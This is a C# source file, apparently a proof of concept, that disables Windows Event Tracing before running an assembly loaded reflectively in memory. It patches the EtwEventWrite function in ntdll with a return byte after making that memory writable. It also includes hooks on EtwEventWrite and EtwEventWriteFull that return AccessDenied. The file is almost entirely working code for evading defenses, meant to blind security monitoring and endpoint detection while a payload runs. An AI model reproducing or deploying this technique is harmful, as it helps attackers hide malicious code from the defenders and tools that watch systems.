using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using MinHook;

namespace NerveGas
{
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }

    class Program
    {
        [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern STRUCTS.NtStatus EtwEventWrite(ulong regHandle, IntPtr eventDescriptor, uint userDataCount, IntPtr userData);

        [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern STRUCTS.NtStatus EtwEventWriteFull(ulong regHandle, IntPtr eventDescriptorPointer, ushort eventProperty, IntPtr activityId, IntPtr relatedActivityId, uint userDataCount, IntPtr userData);

        public static DELEGATES.EtwEventWriteFull ogEtwEventWriteFull;
        public static DELEGATES.EtwEventWrite ogEtwEventWrite;
        public static HookEngine engine = new HookEngine();
        public static STRUCTS.EVENT_DESCRIPTOR descriptor = new STRUCTS.EVENT_DESCRIPTOR();

        public static STRUCTS.NtStatus EtwEventWriteFull_Hook(ulong regHandle, IntPtr eventDescriptorPointer, ushort eventProperty, IntPtr activityId, IntPtr relatedActivityId, uint userDataCount, IntPtr userData)
        {
            Console.WriteLine("ETWEventWriteFull CALLED");
            // return (STRUCTS.NtStatus)ogEtwEventWriteFull(regHandle, eventDescriptorPointer, eventProperty, activityId, relatedActivityId, userDataCount, userData);
            return STRUCTS.NtStatus.AccessDenied;
        }
        public static STRUCTS.NtStatus EtwEventWrite_Hook(ulong regHandle, IntPtr eventDescriptor, uint userDataCount, IntPtr userData)
        {

            //Marshal.PtrToStructure(eventDescriptor, descriptor);
            Console.WriteLine("ETWEventWrite CALLED");
            //return STRUCTS.NtStatus.Success;
            // return (STRUCTS.NtStatus)ogEtwEventWrite(regHandle, eventDescriptor, userDataCount, userData);
            return STRUCTS.NtStatus.AccessDenied;
        }

        public static void NoPryingEyes()
        {
            Console.WriteLine("Who would win, multibillion dollar company or two bytes?\n");
            byte[] patch;
            patch = new byte[2];
            patch[0] = 0xc3;
            patch[1] = 0x00;
            try
            {
                var lib = Win32.LoadLibrary("ntdll.dll");
                var addr = Win32.GetProcAddress(lib, "EtwEventWrite");
                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, addr, patch.Length);

            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Exception: " + e.Message);
            }
            Console.WriteLine("bye bye ETW");
        }

        public static void enableETWHook()
        {
            ogEtwEventWriteFull = engine.CreateHook("ntdll.dll", "EtwEventWriteFull", new DELEGATES.EtwEventWriteFull(EtwEventWriteFull_Hook));
            ogEtwEventWrite = engine.CreateHook("ntdll.dll", "EtwEventWrite", new DELEGATES.EtwEventWrite(EtwEventWrite_Hook));
            engine.EnableHooks();

        }

        public static void sayHello()
        {
            Console.WriteLine("hello");
        }

        public static void execute()
        {
            sayHello();
            byte[] assemblyBytes = File.ReadAllBytes(@"C:\Users\Jean\source\repos\ReflectionDemoApp\bin\Release\ReflectionDemoApp.exe");
            Console.ReadKey();
            Assembly asm = Assembly.Load(assemblyBytes);
            Console.WriteLine("assembly loaded.");
            Console.ReadKey();
            asm.EntryPoint.Invoke(null, new object[] { new String[] { "jean" } });
            Console.ReadKey();
        }
        static void Main(string[] args)
        {
            //enableETWHook();
            //Console.WriteLine("hook got placed");
            // EtwEventWrite(0, IntPtr.Zero, 0, IntPtr.Zero);
            //EtwEventWriteFull(0, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero);
            NoPryingEyes();
            execute();

        }
    }
}
